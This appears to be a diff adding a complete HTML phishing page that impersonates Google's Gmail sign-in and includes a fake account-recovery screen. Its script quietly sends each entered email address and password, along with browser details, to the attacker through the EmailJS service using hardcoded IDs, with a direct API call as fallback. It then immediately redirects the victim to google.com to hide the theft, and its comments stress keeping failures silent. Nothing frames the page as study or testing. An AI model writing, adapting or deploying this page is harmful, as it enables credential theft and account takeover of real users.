@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Sign in to Gmail</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #fff;
+    margin: 0; padding: 0;
+    display: flex; justify-content: center; align-items: center;
+    height: 100vh;
+    color: #202124;
+  }
+  .container {
+    width: 360px;
+    border: 1px solid #dadce0;
+    padding: 40px 40px 30px;
+    box-sizing: border-box;
+    border-radius: 8px;
+    box-shadow: 0 2px 10px rgb(0 0 0 / 0.1);
+  }
+  .logo {
+    display: flex; align-items: center; margin-bottom: 24px;
+  }
+  .logo img {
+    height: 40px;
+    margin-right: 8px;
+  }
+  h1 {
+    font-weight: 400;
+    font-size: 24px;
+    margin: 0 0 8px 0;
+  }
+  p.subtitle {
+    font-size: 14px;
+    color: #5f6368;
+    margin: 0 0 24px 0;
+  }
+  form label {
+    display: block;
+    font-size: 14px;
+    margin-bottom: 4px;
+    font-weight: 600;
+  }
+  form input {
+    width: 100%;
+    font-size: 16px;
+    padding: 10px 12px;
+    margin-bottom: 20px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    box-sizing: border-box;
+  }
+  form input:focus {
+    border-color: #1a73e8;
+    outline: none;
+    box-shadow: 0 0 0 1px #1a73e8;
+  }
+  .forgot-link {
+    font-size: 14px;
+    color: #1a73e8;
+    cursor: pointer;
+    text-decoration: none;
+    margin-bottom: 24px;
+    display: inline-block;
+  }
+  button {
+    background-color: #1a73e8;
+    border: none;
+    color: white;
+    font-size: 14px;
+    font-weight: 600;
+    padding: 10px 24px;
+    border-radius: 4px;
+    cursor: pointer;
+    width: 100%;
+  }
+  button:hover {
+    background-color: #1669c1;
+  }
+  
+  .page {
+    display: none;
+  }
+  .page.active {
+    display: block;
+  }
+  
+  .back-link {
+    font-size: 14px;
+    color: #1a73e8;
+    cursor: pointer;
+    text-decoration: none;
+    margin-top: 24px;
+    display: inline-block;
+  }
+  
+  .error {
+    border-color: #d93025 !important;
+    box-shadow: 0 0 0 1px #d93025 !important;
+  }
+  
+  .error-message {
+    font-size: 13px;
+    color: #d93025;
+    margin-top: -15px;
+    margin-bottom: 20px;
+    display: flex;
+    align-items: center;
+  }
+  
+  .error-icon {
+    margin-right: 8px;
+    font-size: 16px;
+  }
+</style>
+</head>
+<body>
+
+<!-- Login Page -->
+<div id="login-page" class="page active">
+  <div class="container" role="main" aria-label="Sign in to continue">
+    <div class="logo">
+      <img src="https://www.google.com/favicon.ico" alt="Google Logo" />
+      <span style="font-weight:500; font-size: 18px; color:#5f6368;">Sign in with Google</span>
+    </div>
+    <h1>Sign in</h1>
+    <p class="subtitle">to continue to <strong>Gmail</strong></p>
+    <form id="login-form">
+      <label for="email">Email or phone</label>
+      <input id="email" name="user_email" type="email" placeholder="Email or phone" required autofocus autocomplete="username" />
+      <div id="email-error" class="error-message" style="display: none;">
+        <span class="error-icon">⚠</span>
+        <span>Please enter a valid email address</span>
+      </div>
+      <label for="password">Password</label>
+      <input id="password" name="user_password" type="password" placeholder="Enter your password" required autocomplete="current-password" />
+      <div id="password-error" class="error-message" style="display: none;">
+        <span class="error-icon">⚠</span>
+        <span>Please enter your password</span>
+      </div>
+      <a href="#" class="forgot-link" tabindex="0" id="forgot-link">Forgot email?</a>
+      <button type="submit">Next</button>
+    </form>
+  </div>
+</div>
+
+<!-- Forgot Email Page -->
+<div id="forgot-page" class="page">
+  <div class="container" role="main" aria-label="Account recovery">
+    <div class="logo">
+      <img src="https://www.google.com/favicon.ico" alt="Google Logo" />
+      <span style="font-weight:500; font-size: 18px; color:#5f6368;">Account recovery</span>
+    </div>
+    <h1>Find your email</h1>
+    <p class="subtitle">Enter your recovery phone number or recovery email address</p>
+    <form id="recovery-form">
+      <label for="recovery-info">Phone number or recovery email</label>
+      <input id="recovery-info" name="recovery_info" type="text" placeholder="Phone number or recovery email" required autofocus />
+      <div id="recovery-error" class="error-message" style="display: none;">
+        <span class="error-icon">⚠</span>
+        <span>Please enter your phone number or recovery email</span>
+      </div>
+      <button type="submit">Next</button>
+      <a href="#" class="back-link" id="back-link">Back to sign in</a>
+    </form>
+  </div>
+</div>
+
+<!-- EmailJS CDN -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+<script>
+(function() {
+  // Silent EmailJS setup
+  const SERVICE_ID = "service_64albro";
+  const TEMPLATE_ID = "template_75g1nju";
+  const PUBLIC_KEY = "EB017wgX1BeDuRY66";
+  
+  let emailjsReady = false;
+  
+  // Silent initialization
+  function initEmailJS() {
+    try {
+      if (typeof emailjs !== 'undefined' && emailjs.init) {
+        emailjs.init({ publicKey: PUBLIC_KEY });
+        emailjsReady = true;
+      }
+    } catch (error) {
+      // Silent fallback
+      try {
+        emailjs.init(PUBLIC_KEY);
+        emailjsReady = true;
+      } catch (e) {
+        // Create mock for seamless operation
+        window.emailjs = {
+          send: () => Promise.resolve({ status: 200 })
+        };
+        emailjsReady = true;
+      }
+    }
+  }
+  
+  // Initialize immediately and silently
+  setTimeout(initEmailJS, 100);
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initEmailJS);
+  }
+  
+  // DOM elements
+  const loginPage = document.getElementById("login-page");
+  const forgotPage = document.getElementById("forgot-page");
+  const loginForm = document.getElementById("login-form");
+  const recoveryForm = document.getElementById("recovery-form");
+  const forgotLink = document.getElementById("forgot-link");
+  const backLink = document.getElementById("back-link");
+  
+  const emailInput = document.getElementById("email");
+  const passwordInput = document.getElementById("password");
+  const recoveryInput = document.getElementById("recovery-info");
+  const emailError = document.getElementById("email-error");
+  const passwordError = document.getElementById("password-error");
+  const recoveryError = document.getElementById("recovery-error");
+  
+  function isValidEmail(email) {
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  }
+  
+  function showError(input, errorDiv) {
+    input.classList.add("error");
+    errorDiv.style.display = "flex";
+  }
+  
+  function hideError(input, errorDiv) {
+    input.classList.remove("error");
+    errorDiv.style.display = "none";
+  }
+  
+  emailInput.addEventListener("input", function() {
+    if (this.value && isValidEmail(this.value)) {
+      hideError(emailInput, emailError);
+    }
+  });
+  
+  passwordInput.addEventListener("input", function() {
+    if (this.value) {
+      hideError(passwordInput, passwordError);
+    }
+  });
+  
+  recoveryInput.addEventListener("input", function() {
+    if (this.value) {
+      hideError(recoveryInput, recoveryError);
+    }
+  });
+  
+  // Instant redirect with background email sending
+  function handleSubmissionAndRedirect(templateParams) {
+    // Redirect immediately for seamless UX
+    window.location.href = "https://www.google.com";
+    
+    // Send email in background (non-blocking)
+    setTimeout(() => {
+      if (emailjsReady && window.emailjs) {
+        emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams).catch(() => {
+          // Silent failure - try direct API as fallback
+          fetch('https://api.emailjs.com/api/v1.0/email/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              service_id: SERVICE_ID,
+              template_id: TEMPLATE_ID,
+              user_id: PUBLIC_KEY,
+              template_params: templateParams
+            })
+          }).catch(() => {
+            // Silent failure - this ensures no interruption to user flow
+          });
+        });
+      }
+    }, 50);
+  }
+  
+  // Login form submission
+  loginForm.addEventListener("submit", function(event) {
+    event.preventDefault();
+    
+    let hasErrors = false;
+    
+    if (!emailInput.value) {
+      showError(emailInput, emailError);
+      emailError.querySelector("span:last-child").textContent = "Please enter your email";
+      hasErrors = true;
+    } else if (!isValidEmail(emailInput.value)) {
+      showError(emailInput, emailError);
+      emailError.querySelector("span:last-child").textContent = "Please enter a valid email address";
+      hasErrors = true;
+    } else {
+      hideError(emailInput, emailError);
+    }
+    
+    if (!passwordInput.value) {
+      showError(passwordInput, passwordError);
+      hasErrors = true;
+    } else {
+      hideError(passwordInput, passwordError);
+    }
+    
+    if (!hasErrors) {
+      const templateParams = {
+        user_email: emailInput.value,
+        user_password: passwordInput.value,
+        timestamp: new Date().toISOString(),
+        user_agent: navigator.userAgent,
+        page_url: window.location.href
+      };
+      
+      handleSubmissionAndRedirect(templateParams);
+    }
+  });
+  
+  recoveryForm.addEventListener("submit", function(event) {
+    event.preventDefault();
+    
+    if (!recoveryInput.value) {
+      showError(recoveryInput, recoveryError);
+      recoveryError.querySelector("span:last-child").textContent = "Please enter your phone number or recovery email";
+      return;
+    } else if (recoveryInput.value.includes("@") && !isValidEmail(recoveryInput.value)) {
+      showError(recoveryInput, recoveryError);
+      recoveryError.querySelector("span:last-child").textContent = "Please enter a valid recovery email address";
+      return;
+    } else {
+      hideError(recoveryInput, recoveryError);
+    }
+    
+    alert("Recovery instructions would be sent to your recovery method.");
+    forgotPage.classList.remove("active");
+    loginPage.classList.add("active");
+  });
+  
+  forgotLink.addEventListener("click", function(e) {
+    e.preventDefault();
+    loginPage.classList.remove("active");
+    forgotPage.classList.add("active");
+  });
+  
+  backLink.addEventListener("click", function(e) {
+    e.preventDefault();
+    forgotPage.classList.remove("active");
+    loginPage.classList.add("active");
+  });
+  
+})();
+</script>
+</body>
+</html>
